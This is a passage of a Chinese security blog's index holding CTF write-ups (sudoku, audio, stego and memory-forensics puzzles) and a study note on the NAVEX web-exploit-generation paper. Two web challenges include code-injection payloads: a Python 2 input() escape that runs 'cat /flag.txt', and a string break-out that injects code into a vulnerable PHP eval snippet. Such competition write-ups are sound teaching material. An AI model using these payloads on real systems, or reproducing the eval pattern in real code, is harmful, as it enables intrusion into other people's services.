x=sympy.di","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:8:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x08 西湖论剑-密码人集合 nc连接访问 ------------------------------\r论 * * | * * * | * * 一\r* * * | 要 * 一 | * * * * 一 西 | * 论 第 | * 我 * ------------------------------\r* 要 * | * 一 * | * * 剑\r* * * | * * 湖 | * * * * * * | * * * | * 湖 * ------------------------------\r* * 一 | * 第 * | * * * 剑 * * | * * * | * * * 西 * * | 一 湖 * | * 第 * ------------------------------\r可以发现是西湖论剑我要拿第一中的几个字构成的数独，用数字替换，得到 ------------------------------\r6 * * | * * * | * * 9\r* * * | 2 * 9 | * * * * 9 4 | * 6 8 | * 1 * ------------------------------\r* 2 * | * 9 * | * * 7\r* * * | * * 5 | * * * * * * | * * * | * 5 * ------------------------------\r* * 9 | * 8 * | * * * 7 * * | * * * | * * * 4 * * | 9 5 * | * 8 * ----------------------------\r在线求解，去掉换行得到612534879378219465594768213125893647836475921947126358259681734781342596463957182，替换得到，论我要湖拿西第剑一拿剑第要我一西论湖湖一西剑论第要我拿我要湖第一拿论西剑第拿论西剑湖一要我一西剑我要论拿湖第要湖一论第我剑拿西剑第我拿西要湖一论西论拿一湖剑我第要 ","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:9:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-11-11","objectID":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/:0:0","tags":["学术研究"],"title":"NAVEX-精确且可扩展的动态Web应用EXP生成系统","uri":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/"},{"categories":["学习","安全技术"],"content":"0x00 前言 最近，要开始方班研讨厅了，在选题时，决定从SDN、指纹、EXP、拟态防御这四个里面挑选，最后结合自己正在做的自动化渗透测试系统和学长提到的EXP评分，把重点放在了EXP上面，而后在调研多家厂商的标准后，发现太工程化了，很难以研讨的方式讲述，在搜索相关资料时，看到了自动生成EXP的论文，在一番比较后，选择了18年发表在USENIX上的《NAVEX: Precise and scalable exploit generation for dynamic web applications》为题，这篇论文整体真的不错，但也存在一些小问题，比如7分76秒这种迷之错误，不过**Distinguished Paper Award Winner**的分量还是有的，整体的架构和算法都比较好理解，这里做个简单的学习笔记。 ","date":"2021-11-11","objectID":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/:1:0","tags":["学术研究"],"title":"NAVEX-精确且可扩展的动态Web应用EXP生成系统","uri":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/"},{"categories":["学习","安全技术"],"content":"0x01 研究背景 首先为大家介绍两个概念，什么是动态web应用和EXP生成系统。 动态web应用和静态web应用的区别在哪儿？ 动态web应用除了可以包含静态资源（例如，图像和 HTML 文件）外，还可以包含动态资源（例如，Servlet、JSP 文件、过滤器和相关联的元数据）。静态web应用则只能包含静态资源。 现代web应用多采取动态的架构，如下图所示，红色圈出的部分是静态架构中所没有的部分，插件会对web容器进行动态请求资源，容器返回动态响应给服务器，这个过程很好地体现出动态特性，即根据用户交互和其他输入“动态”生成内容。 下面给大家看两个动态web应用的例子，Wordpress博客和织梦的内容管理系统。 但同时动态的特性也增加了web应用程序的复杂性，进行人工手动的代码审计的时间成本高，且可能存在审计不完整和效率低下的问题，即漏报和误报。 现在的一些现代web应用安全性的分析方法，如代码审计神器RIPS的核心技术——模拟PHP内置特性的静态代码精确分析技术、基于代码属性图的PHP分析技术、结合启发式的静态源码分析检测EAR漏洞、Web模板语言中使用类型限定符的上下文自动过滤等等，它们都存在同一个问题：误报高，需要人工检查核验。 OK,讲完了动态web应用，下面就介绍下EXP。 这里给出维基百科和metasploit官方的定义。 EXP ，全称Exploit ，为了利用漏洞而编写的攻击程序，即漏洞利用程序。 An exploit executes a sequence of commands that target a specific vulnerability found in a system or application to provide the attacker with access to the system. 简单说，EXP就是利用特定的漏洞执行一串代码获取权限。下面以线上购物为例，介绍EXP实例。漏洞存在于结算页面，用户需要先登录浏览页面，再跳转到购物车页面，在结算页面对id参数实现SQL注入，一个完整的EXP需要将这3个步骤串联起来，构造整个HTTP请求的路径。 EXP自动生成和手动编写步骤有所区别，这里举一种自动生成的例子，它会对源代码进行分析，找出所有潜在的漏洞，自动构造恶意HTTP请求输入序列，进行尝试，最后恶意序列将应用程序的执行指向可疑的漏洞点。 EXP自动生成大多使用静态分析方法，以牺牲精度来换取覆盖率； Web应用的内容(如表单、链接、JS代码)通常是动态生成的，代码在不同的层次上执行，很难从静态角度进行建模。 现在，就将自动生成动态web应用EXP的挑战做一个简单的汇总，扩展性的挑战来源于Web应用越来越复杂，漏洞的种类越来越繁多，动态特征的挑战是由于静态分析的局限，比如无法推断动态将会生成怎样的表单，最后是污点可达性的挑战，所谓污点可达性就是怎样找到一个完整的HTTP请求输入序列来指向漏洞点，模块之间的复杂依赖和无害处理的风险加大了分析的难度，这里的无害处理是指比如说过滤、强制转换等能够将恶意输入无害化的操作。 怎样应对这些挑战呢？论文中就提出来NAVEX的方案，以静态分析为指导，辅助动态分析，简称，动静结合，这个策略有3大好处，适用于大型应用，有效降低复杂性，代码覆盖率高。 ","date":"2021-11-11","objectID":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/:2:0","tags":["学术研究"],"title":"NAVEX-精确且可扩展的动态Web应用EXP生成系统","uri":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/"},{"categories":["学习","安全技术"],"content":"0x02 核心原理 这里是它的架构图，可以简单看作两步走，先进行漏洞点识别，再生成具体EXP。 信息的输入端需要动态web应用的源代码和预置的攻击字典，这个字典实际上就是针对多种漏洞的分析模板，NAVEX是实现了对6种漏洞进行分析，一个完整的字典由4部分构造，这里结合XSS的实例与大家讲解，XSS漏洞通常可以利用echo、print这些函数实现，所以我们将其定义为敏感操作，第2部分是字符替换等过滤函数，第3部分是遍历类型，这个会在后续展开讲解，第4部分就是XSS的攻击语句。 将信息输入后，NAVEX系统会进行漏洞点的识别，识别又划分了三部分，图的构造和遍历，以及公式的构造，我会按照自顶向下的顺序展开，在构造图中NAVEX所采用的模型是基于代码属性图CPG的，什么是CPG?给大家介绍下概念。 首先，明确一个公式。 它是由三种图构成的，我们以代码为例，先构造抽象语法树AST。 可以看到代码中的操作数被关联为叶子节点，内部节点则代表运算符，这种图适合简单的代码分析，代码量过大时，生成的树会很复杂。 再构造控制流图CFG，可以看到图中控制语句的执行逻辑，便于我们理解整个程序的运行，但这种方式定位不了漏洞点。 最后构造程序依赖图PDG，可以看到清晰的依赖关系，比如x的定义语句对后面有x出现的语句都存在数据依赖，if判断语句和他对应的执行语句也存在着控制依赖的关系，先有因后有果。 CPG就是个缝合怪，将这三种图组合起来，融合AST的语法结构、CFG的执行路径、PDG的依赖关系的一种数据结构。 虽然CPG是一种强大的数据结构，但它只进行过程内分析，这里加入调用图CG，构造调用的函数节点到对应定义根节点的边，来实现过程间层次上的推理。最后使用过滤函数标签来解析语句的过滤状态，比如有没有强制转换，使用数据库约束标签收集表名、列名、数据类型和值约束(例如，NOT NULL)等信息 。 完成图的构造后，需要进行遍历来搜索脆弱路径，遍历依据不同的漏洞类型分为向前、向后，下面介绍漏洞的遍历算法。 向后的遍历算法，实际上是从可能漏洞点向后搜索到达源点的路径，先依据攻击字典查找可能的漏洞点，再对所有遍历的路径进行一个剪枝的操作，去除含有过滤函数等的路径，最终返回一组脆弱路径。正向遍历则反过来，从源点到可能漏洞点的路径搜索。 完成遍历后得到的脆弱路径，被定义为Fpath，加上构造图中的数据库约束Fdb和攻击字典中的攻击字符串Fattack，组成扩充公式，发送到求解器，构造EXP字符串。最后将漏洞点和EXP字符串用于下一部分，EXP的具体生成。 生成具体EXP分为三部分，动态执行，构建导航图，最终生成EXP，之前的漏洞点识别是静态分析的部分，而NAVEX动静结合的创新点主要在动态的执行，下面为大家介绍通过爬虫来解决客户端约束条件。 爬虫会对每个角色类型进行身份验证，比如线上购物的用户和管理员，这样能把代码覆盖率最大化，然后从种子url开始广度优先遍历，遍历过程中搜集3个对象，链接将会作为下一次的种子url，JS和表单会利用符号执行等方法提取他们的约束信息，用于构造HTTP请求。 下面是一个例子，bookname的取值只有两种，得到Fhtml的值是a或b的关系，JS代码中当edition小于0是将会返回false,得到的Fjs就必须大于0，Fjs和Fhtml组成了Fform，经过约束求解器会得到如下的HTTP请求。 爬虫是解决客户端的约束，而服务端的约束又要怎样解决呢？ 什么是服务端约束？大家可以看到在代码中对publisher的长度在后端进行了判断，在前端我们无法获取这个约束条件。 这里引入了跟踪引擎的概念，会不断提取服务端约束进行尝试，直达它状态改变或者执行敏感操作，我们就认为成功了，会将信息存储，作为节点。 下面是一个同时满足客户端约束和服务端约束的例子。 (bookname==\"intro to CS by author1\"∨bookname==\"intro to Math by author2\")∧\rlength(publisher)\u003c=35∧edition \u003e0\r导航图表示模块执行的可能序列，导航图是有向图_G= (N,E)_ ，节点表示HTTP请求，边表示节点之间的导航(类型是链接或表单) ，_e = (ni，nj)∈ E， ni_表示发出请求的页面。由下方表格中的4种属性构成，每个节点是一个HTTP请求，边是链接或表单，作为节点的导航连接。 NAVXE的优点就是将漏洞EXP的构造问题转换为对图的简单搜索问题，以下面的导航图为例，他就将6个层层递进的http请求转换成了从index节点到漏洞点的搜索，最终组合的http加上漏洞点识别步骤中得到的EXP字符串，生成最终的EXP。 ","date":"2021-11-11","objectID":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/:3:0","tags":["学术研究"],"title":"NAVEX-精确且可扩展的动态Web应用EXP生成系统","uri":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/"},{"categories":["学习","安全技术"],"content":"0x03 实验结果 数据集选取标准：评估最流行应用的最新版本，并且要求是复杂且大型的PHP应用程序 数据集：26个真实PHP应用程序，代码库组合为320万多行源代码和2万多个PHP文件。 应用（版本） PHP****文件数量 PHP****源代码行数 WordPress (4.7.4) 699 181257 MediaWiki (1.30.0) 3680 537913 Joomla (3.7.0) 2764 302701 Drupal (8.3.2) 8626 585094 …… …… …… NAVEX总共生成了204个EXP 其中195个是注入漏洞(SQLI和XSS) 9个是逻辑漏洞(EAR) 降低了**87%**的误报 提高了**54%**的精度 能够深入到6个HTTP请求以拼接EXP 能够分析的漏洞类型达到6种 第一个可以自动发现并利用EAR漏洞的方案 ","date":"2021-11-11","objectID":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/:4:0","tags":["学术研究"],"title":"NAVEX-精确且可扩展的动态Web应用EXP生成系统","uri":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/"},{"categories":["学习","安全技术"],"content":"0x04 总结 ","date":"2021-11-11","objectID":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/:5:0","tags":["学术研究"],"title":"NAVEX-精确且可扩展的动态Web应用EXP生成系统","uri":"/2021-11-11-navex-%E7%B2%BE%E7%A1%AE%E4%B8%94%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8A%A8%E6%80%81web%E5%BA%94%E7%94%A8exp%E7%94%9F%E6%88%90%E7%B3%BB%E7%BB%9F/"},{"categories":["WriteUp"],"content":"\rMISC大赛了属于是，麻了，出了个web就没咋做了，参考http://www.7yue.top/dasctf-oct-x-吉林工师-wp学习复现下MISC吧。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:0:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x00 魔法少女的迷音 可恶，魔法少女的信息被大魔王截断加密了，快救救她 打开压缩包，文件末尾写着 nIhtnmTm+m0a+m0a0lA5LIA5LIA5LIA5LIA5LIA5LIA5LIA5LIA5L/CC\ratom128\r第一列atom128解密得到passswowoowowddddddddddddddddddddddddddd，播放音频，听着像是倒放，反向后发现在念数字。记录为：151 55 97 51 49 53 54 48 98 153 153 51 150 50 48 99 57 97 52 57 50 102 97 153 54 48 49 然后卡死在这里，方向错了，在想是不是啥截断解密，后来发现读的应该是100 51 55 97 51 49 53 54 48 98 100 53 100 53 51 100 50 50 48 99 57 97 52 57 50 102 97 100 53 54 48 49，10进制转ascii得到d37a31560bd5d53d220c9a492fad5601 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:1:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x01 WELCOME DASCTFxJlenu 一直卡在这儿，后来发现这并不是从web页面入手的。。。。 nc连接了随便填个数，怀疑是python2的input漏洞，参考https://blog.csdn.net/weixin_43921239/article/details/108569794，输入__import__('os').system('cat /flag.txt') ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:2:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x02 迷路的魔法少女 魔法少女迷失在了代码空间 请寻找她现在在哪 \u003c?php\rhighlight_file('index.php');\rextract($_GET);\rerror_reporting(0);\rfunction String2Array($data)\r{\rif($data == '') return array();\r@eval(\"\\$array = $data;\");\rreturn $array;\r}\rif(is_array($attrid) \u0026\u0026 is_array($attrvalue))\r{\r$attrstr .= 'array(';\r$attrids = count($attrid);\rfor($i=0; $i\u003c$attrids; $i++)\r{\r$attrstr .= '\"'.intval($attrid[$i]).'\"=\u003e'.'\"'.$attrvalue[$i].'\"';\rif($i \u003c $attrids-1)\r{\r$attrstr .= ',';\r}\r}\r$attrstr .= ');';\r}\rString2Array($attrstr); extract函数将$_GET传入的变量组合成一个数组后，再拆解开来，根据源代码可知，需要创建attrid和attrvalue两个参数。String2Array字符串转数组的函数，容易造成命令执行漏洞。 构造payload：attrid[]=1\u0026attrvalue[]=2\");phpinfo();//，在phpinfo里面搜索flag找到对应字段，得到flag{7c36c113-c4a3-4855-bd5b-adb7f0ed85f4} ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:3:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x03 不可以色色 some body touch my flag！ 题目貌似在提示body标签，查看发现存在video.?的提示信息。 应该存在一个video.?文件，尝试下文件后缀，得到压缩包。 打不开文件，查看发现文件头有问题啊 修改为正常的 然后看到一段离谱的动画，里面有几帧闪现了奇怪的码，使用命令ffmpeg -i C:\\Users\\38952\\Desktop\\video\u003ccode\u003e\\video\\video.mp4 example.%d.jpg 得到了一些码图，看dalao的WP才知道是PDF417二维条码。 拼接如下 在https://products.aspose.app/barcode/zh-hans/recognize/pdf417#/recognized扫描得到flag，DASCTF{8e2d479e26b3093651293f9fa26e3404}。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:4:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x04 魔法秘文 ”来尝试获取我的秘密吧“ 魔法少女说到 压缩包解开得到一张图。 binwalk发现一个压缩包，分离出来。 文件尾有存在可疑的url编码字符串。 转换得到200个汉字，是按笔画排的，结合hint，密码由32个中文组成，这串汉字铁定有问题。 二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙 压缩包内容 修改后缀为ttf，安装字体，然后在word里面输入上述汉字。会发现有的字歪了。 挑出来是丁厂八九几刀于干工上小个门之马王云木尤切少牛分六方丑玉古节可石布，解压后得到flag。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:5:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x05 闯入魔塔的魔法少女 魔法少女只身进入魔塔只为打败大魔王并获得flag 用FFDec打开分析，直接在P-Code中搜索flag。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:6:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x06 giveyourflag 过来白嫖 把文件放入010里面查看，发现是压缩包套娃。 这里用脚本处理一下 from os import system\rimport zipfile\rzipname = \"flag1\"\rf = zipfile.ZipFile(zipname, 'r')\rwhile 1:\rtry:\rname = f.namelist()[0]\rprint (name)\rf.extractall()\rsystem('rm -rf '+ str(zipname))\rf = zipfile.ZipFile(name, 'r')\rzipname = name\rexcept:\rbreak\r最后得到flag文件，内容为：R0RWRldJezdnZ3FnbGwzanl1a2RuY3N0aTlpY3BjM2ZlYjB2NW9wfQ==，解base64得到GDVFWI{7ggqgll3jyukdncsti9icpc3feb0v5op}，凯撒密码解密得到DASCTF{7ddndii3gvrhakzpqf9fzmz3cby0s5lm} ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:7:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x07 英语不好的魔法少女 这个魔法少女的英语就是逊啦 把图片丢到010中，发现tpWj数据块有stego_text.txt 在https://masterqian.github.io/picdir/进行提取图片文件夹中的文件，得到一堆单词 在http://330k.github.io/misc_tools/unicode_steganography.html零宽字节解密得到yjPW8RIz0og8HX3o6BcwTmveeyyEDiCurJNTwPJeY/PMyOhHXYVKPLln6isBRyL0 用word对单词进行检查，发现存在拼写错误 可以手动检查，也可以用脚本跑，最后得到的结果如下： accuratm\rextfnt\rbiks\requivalens\ropenev\rsendinx\rfoumula\rfecused\rjournsy\rthreht\roparational\rhandbnok\rsguthwest\r错误的字母为：mfsvxueshang 然后将零宽字节解密得到的数据作为密文，单词错误字母作为key，求解AES，得到最终的flag。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:8:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x08 虚幻3 wdb！我真的好好喜欢你啊，为了你，我要出虚幻3！ 这题据说跟网鼎杯里的虚幻系列类似，需要对提取最低位像素，转化黑白，然后grb顺序组合在一起，为一个汉信码。 这里直接贴下大佬的脚本 from PIL import Image\rpic = Image.open('cipher.bmp')\ra, b = pic.size\rr1 = [] # 储存r、g、b通道\rg1 = []\rb1 = []\rr2 = [] # 一行一行临时储存\rg2 = []\rb2 = []\rfor y in range(b):\rfor x in range(a):\rr2.append(pic.getpixel((x, y))[0] % 2)\rg2.append(pic.getpixel((x, y))[1] % 2)\rb2.append(pic.getpixel((x, y))[2] % 2)\rr1.append(r2)\rg1.append(g2)\rb1.append(b2)\rr2 = []\rg2 = []\rb2 = []\rpic_1 = Image.new('L', (a, b*3), 255)\rfor y in range(0, len(r1)*3, 3):\rfor x in range(len(r1[0])):\rpic_1.putpixel((x, y), g1[y//3][x] * 255)\rpic_1.putpixel((x, y+1), r1[y//3][x] * 255)\rpic_1.putpixel((x, y+2), b1[y//3][x] * 255)\rpic_1.show()\rpic_1.save('flag.bmp')\r最后得到 这里补上汉信码的定位符即可扫描出flag。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:9:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x09 阴游大师 人人都知道Fz是音游椰椰 用Malody打开，发现最右侧有多出来的数据。 用010查看是zip格式的，重命名下，再解压，得到三个文件。 mc的内容如下： 猜测column为9时，存在异常数据，写脚本解出所有的column import json\rfp = open('1634029079.mc', 'r')\rdata = fp.read()\rjson1 = json.loads(data)\rnote = json1['note']\rfor i in note:\rprint(i['column'], end='')\r发现所有异常数据都在0000-00000000这个区间内 提取出数据，转十进制 发现011不对，应该是101 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:10:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x0A 魔法信息 大魔王截获了魔法少女的信息，oh no 追踪tcp流，发现一个zip数据包。 然后导出数据包，发现压缩包存在问题，但用7z能够把pdf文件提取出来，同时，pdf文件也存在数据问题。用010edittor打开pdf模板进行分析，发现flag。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:11:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x0B 彁彁 请在做题前阅读： 当暴露在特定光影图案或闪光光亮下时，有极小部分人群会引发癲痫。这种情形可能是由于某些未查出的癫病症状引起，即使该人员并没有患癫痫病史也有可能造成此类病症。如果您的家人或任何家庭成员曾有过类似症状，请在进行游戏前咨询您的医生或医师。 视频很花，看到20几秒时，好像有二维码闪过，用ffmpeg分离出所有的帧。 简单拼接得到 导入，识别 可以得到关键词snowywar、git等等，搜索得到https://gitee.com/snowywar/gege 将4444.png拉下来分析，发现一个网址 日语死的维基百科 twitter.jpg里面藏有文件，导出压缩包，发现存在密码，用死解密 最终得到=6270yFdE0\u003c?@H0=@G60562C=J0v60v6,ROT47得到flag ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:12:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x0C 卡比卡比卡比 卡比！ 解压得到两个文件。 volatility -f 1.raw imageinfo #查看系统版本 volatility -f 1.raw --profile=Win7SP1x64 pslist # 列出进程 使用pstree，可以识别出被隐藏的进程，发现最后存在cmd进程和ie进程。 使用iehistory，看看历史记录，发现搜索记录和key.png文件 搜索的内容如下： 先使用filescan找到key.png文件，volatility -f 1.raw --profile=Win7SP1x64 filescan | grep key.png 再通过dumpfiles提取，volatility -f 1.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e5e94c0 -D ./ key.png实际上是text文本，内容是我记得我存了一个非常棒的视频，但怎么找不到了，会不会在默认文件夹下。 视频的默认文件夹是Video，尝试搜索一下Video，发现可疑的文件，dump出来的内容为xzkbyyds!。 查看cmd命令使用情况，volatility -f 1.raw --profile=Win7SP1x64 cmdscan，发现异常输入 5201314可能是之前搜索的前缀，这里再次filescan一下，找到异常文件，dump出来。 下一步需要使用mimikatz获取windows的账号及明文密码，这里一直没有安装好，用PTF也可以找到密码MahouShoujoYyds。 解压后的文件如下 import struct\rkey = 'xxxxxxxxx'\rfp = open('!@#$importance', 'rb')\rfs = open('!@#$unimportance', 'wb')\rdata = fp.read()\rfor i in range(0, len(data)):\rresult = struct.pack('B', data[i] ^ ord(*key[i % len(key)]))\rfs.write(result)\rfp.close()\rfs.close()\r回想起最初的文件之一名字是!@#$unimportance，用之前的key来逆一下 import struct\rkey = 'xzkbyyds!'\rfp = open('!@#$importance', 'wb')\rfs = open('!@#$unimportance', 'rb')\rdata = fs.read()\rfor i in range(0, len(data)):\rresult = struct.pack('B', data[i] ^ ord(*key[i % len(key)]))\rfp.write(result)\rfp.close()\rfs.close()\r拖到kali里面发现是图片 进一步确认是gif 这里注意一个细节，kali中显示的是119x103，实际的像素是119x119，我们用010editor打开，发现高度不对，6、7字节为宽， 8、9字节为高，且为小端序储存方式，修改6为7。 用NamoGif打开，发现flag。 ","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:13:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["WriteUp"],"content":"0x0D Twinkle Twinkle Starry Night Twinkle twinkle little star, get your flag somewhere far. nc连接后得到一大串base64 ICAgICArICAgICArICAgICAgICArICAqICAgICAgKyogICAgICAgICsgICogICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICAgICArICAqICAgICAgKyoKICAgICAgICArICAqICAgICAgKyogICAgICsgICAgICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICArKiAgICAgICAKICsgICogICAgICAgKyogICAgICAgICsgICogICAgICArKiAgICAgKyAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgKyogICAgICAgICsgICoKICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICsqICAgICArICAgICAgICArICAqICAgICAgKyogICAgICAgICsgICogICAgICsqICAKICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgLiAgICAgLiAgICAgLiArICAgLiAgICAgKyAgICAKICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgKyogICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICogICAKICArKiArIC4gICAgICsgICAgICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAKICAgKyogKyAgICAgLiAgICAgKyAgICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICsqICAgICAgICArICAqICAKICAgICArKiAgICAgKyAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgICsKKiAgICAgICAgKyAgKiAgICAgICArKiAgICAgKyAgICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICArKiAgICAKICAgICsgICogICAgICsqICAgICAuICAgICAuICsgICAgICAgLiAgICAgKyAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICAgICAKKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAgKyogKyAgICAgLiAgICAgKyAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICAKICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICsqICAgICArICAg